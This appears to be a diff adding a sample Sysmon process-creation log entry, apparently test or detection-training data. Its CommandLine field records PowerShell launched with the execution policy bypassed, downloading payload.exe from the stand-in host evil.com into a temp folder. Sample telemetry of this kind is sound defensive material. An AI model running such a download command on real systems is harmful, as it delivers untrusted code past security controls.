@@ -1,0 +1,8 @@
+{
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe\"",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\jsmith",
+    "Computer": "WORKSTATION-05"
+}
